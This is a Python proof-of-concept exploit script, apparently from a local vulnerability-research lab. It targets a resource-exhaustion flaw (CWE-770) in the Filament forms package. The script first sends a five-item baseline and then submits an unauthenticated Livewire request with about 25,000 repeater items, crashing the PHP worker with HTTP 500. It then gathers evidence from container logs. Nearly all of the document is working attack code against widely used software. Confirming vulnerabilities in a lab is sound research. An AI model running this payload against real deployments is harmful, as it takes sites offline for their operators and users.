#!/usr/bin/env python3
"""
VULN-011 — Repeater/Builder accept an unbounded number of client items (DoS)

Vulnerable code: targets/filament/packages/forms/src/Components/Concerns/CanLimitItemsLength.php
  - :10  protected int|Closure|null $maxItems = null;     (no default cap)
  - :14-37 maxItems(): the "max:" validation rule is registered ONLY when maxItems() is called
  hydration scales with the client item count:
  - packages/forms/src/Components/Repeater.php:185 (one child per item)
  - packages/forms/src/Components/Builder.php:158-168
  input: the item array is client-controlled Livewire state (data.<repeater>), not #[Locked]

Class: CWE-770 Allocation of Resources Without Limits or Throttling (DoS).

The flaw in plain English
-------------------------
A Repeater/Builder instantiates, hydrates and validates ONE full child schema per
item present in the client-submitted array. maxItems() is opt-in validation only;
with it unset (the default) there is no server-side ceiling on item count. Because
the item array is client-controlled Livewire state, a single submit carrying tens of
thousands of items forces proportional per-request work.

Exploitation idea
-----------------
Submit a repeater state with ~25k items. The server builds ~25k child schemas (each
a TextInput + Select) on re-render → exhausts the 30s execution budget (or 512M) → 500.

What a successful run proves
---------------------------
A small repeater (few items) re-renders instantly; the same component with ~25k items
makes the server spend 30s and return HTTP 500 — a single request crashes the worker
(availability impact). Reachable UNAUTHENTICATED on the demo form page.
"""

import os
import sys
import time
import json

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))
from lib.livewire import LivewireClient, LivewireError   # noqa: E402
from lib.common import log, banner, verdict              # noqa: E402

BASE_URL = os.environ.get("BASE_URL", "http://localhost:21890")
ITEMS = int(os.environ.get("REPEATER_ITEMS", "25000"))   # enough to exceed the 30s budget
VULN_ID = "VULN-011"
HERE = os.path.dirname(os.path.abspath(__file__))
PAGE = f"{BASE_URL}/forms/fields/repeater"


def get_demo(c: LivewireClient):
    return next(x for x in c.parse_components(c.fetch(PAGE)) if x.name == "forms.fields-demo")


def main() -> int:
    banner(VULN_ID, "Repeater/Builder accept unbounded client items (DoS)",
           BASE_URL, "CanLimitItemsLength — no default maxItems; one child schema hydrated per item")

    # --- BASELINE: a human-sized repeater is instant --------------------------
    c = LivewireClient(BASE_URL, timeout=90)
    comp = get_demo(c)
    small = [{"name": f"n{i}", "role": "developer"} for i in range(5)]
    t = time.time()
    comp.set({"data.repeater": small})
    base_dt = time.time() - t
    log("INFO", f"baseline: 5-item repeater → HTTP 200 in {base_dt:.2f}s")

    # --- ATTACK: a huge item array ------------------------------------------
    # data.repeater is public Livewire state; each item becomes a full child schema
    # (TextInput 'name' + Select 'role') on hydrate/render → O(items) work.
    items = [{"name": f"n{i}", "role": "developer"} for i in range(ITEMS)]
    payload_bytes = len(json.dumps(items))
    log("STEP", f"submitting a {ITEMS}-item repeater array ({payload_bytes} bytes) → the server "
                f"hydrates {ITEMS} child schemas in one request")
    comp2 = get_demo(LivewireClient(BASE_URL, timeout=90))
    t = time.time()
    status = None
    try:
        body = comp2.set({"data.repeater": items})
        atk_dt = time.time() - t
        status = 200
        with open(os.path.join(HERE, "response.txt"), "w") as f:
            f.write(json.dumps(body)[:1500])
        log("INFO", f"attack returned HTTP 200 in {atk_dt:.2f}s (did not exceed the budget this run)")
    except LivewireError as e:
        atk_dt = time.time() - t
        status = 500 if "HTTP 500" in str(e) else -1
        with open(os.path.join(HERE, "response.txt"), "w") as f:
            f.write(str(e)[:1500])
        log("PROOF", f"attack returned HTTP {status} after {atk_dt:.2f}s — the worker crashed "
                     f"building {ITEMS} child schemas for one request")

    cause = None
    try:
        import subprocess as sp
        logs = sp.run(["docker", "compose", "-p", "cvehunterlab_filament", "logs", "app", "--since", "80s"],
                      capture_output=True, text=True, timeout=30,
                      cwd="/opt/cvehunter/targets/filament/_cvehunter_lab").stdout
        for line in logs.splitlines():
            if "Maximum execution time" in line or ("Allowed memory size" in line and "exhausted" in line):
                cause = line
                break
    except Exception:  # noqa: BLE001
        pass
    if cause:
        os.makedirs(os.path.join(HERE, "evidence"), exist_ok=True)
        with open(os.path.join(HERE, "evidence", "dos_log.txt"), "w") as f:
            f.write(cause)
        log("PROOF", "app log: " + cause.split("production.ERROR:")[-1].strip()[:120])

    if status == 500:
        log("OK", f"exploit confirmed — a single {ITEMS}-item submit crashed the worker "
                  f"(~{atk_dt:.0f}s vs {base_dt:.2f}s baseline); no default maxItems cap")
        verdict(VULN_ID, "CONFIRMED",
                f"one unauthenticated submit of {ITEMS} repeater items exhausts the worker "
                f"(A); no default item cap (maxItems null)")
        return 0

    log("FAIL", "attack did not crash the worker at this item count; raise REPEATER_ITEMS and re-run")
    verdict(VULN_ID, "NEEDS_MANUAL", "no crash at this size — increase REPEATER_ITEMS")
    return 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception as e:  # noqa: BLE001
        log("FAIL", f"unexpected error: {e!r}")
        verdict(VULN_ID, "FAILED", f"exception: {e!r}")
        sys.exit(1)
